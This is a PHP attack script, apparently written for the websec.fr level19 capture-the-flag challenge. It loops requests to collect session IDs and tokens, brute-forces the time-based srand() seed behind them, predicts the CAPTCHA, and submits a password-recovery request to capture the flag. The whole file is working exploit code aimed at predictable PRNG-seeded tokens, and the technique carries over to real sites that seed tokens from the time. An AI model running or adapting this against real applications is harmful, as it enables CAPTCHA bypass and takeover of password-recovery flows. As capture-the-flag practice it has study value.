<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    LEARNING ATTACK - Pattern recognition                  ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

// Base de datos de tokens observados
$observed_tokens = [];
$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    $timestamp = time();
    
    // Guardar el token observado
    $observed_tokens[] = [
        'token' => $real_token,
        'time' => $timestamp,
        'round' => $round
    ];
    
    // Mantener solo los últimos 1000
    if (count($observed_tokens) > 1000) {
        array_shift($observed_tokens);
    }
    
    echo "[Round $round] Token: " . substr($real_token, 0, 12) . "... | DB size: " . count($observed_tokens) . "\n";
    
    // Estrategia de aprendizaje: buscar qué timestamp generó tokens similares en el pasado
    $candidate_seeds = [];
    
    // 1. Buscar tokens que empiezan con las mismas letras
    $prefix = substr($real_token, 0, 4);
    foreach ($observed_tokens as $obs) {
        if (substr($obs['token'], 0, 4) === $prefix) {
            // Probar timestamps cercanos a cuando se observó este token similar
            for ($offset = -60; $offset <= 60; $offset++) {
                $candidate_seeds[] = $obs['time'] + $offset;
            }
        }
    }
    
    // 2. Timestamps recientes
    for ($offset = -300; $offset <= 300; $offset++) {
        $candidate_seeds[] = $timestamp + $offset;
    }
    
    // 3. Si tenemos suficientes observaciones, buscar intervalos comunes
    if (count($observed_tokens) >= 10) {
        $times = array_map(function($o) { return $o['time']; }, $observed_tokens);
        $intervals = [];
        for ($i = 1; $i < count($times); $i++) {
            $intervals[] = $times[$i] - $times[$i-1];
        }
        $avg_interval = array_sum($intervals) / count($intervals);
        
        // Probar seeds basados en el intervalo promedio
        for ($i = -5; $i <= 5; $i++) {
            $predicted = $timestamp + ($i * $avg_interval);
            $candidate_seeds[] = intval($predicted);
        }
    }
    
    $candidate_seeds = array_unique($candidate_seeds);
    
    foreach ($candidate_seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        
        if ($test_token === $real_token) {
            echo "\n  ✓✓✓ LEARNED MATCH! Seed: $seed ✓✓✓\n";
            echo "  Time offset: " . ($seed - $timestamp) . " seconds\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n  SUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "  FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    usleep(200000);
}
?>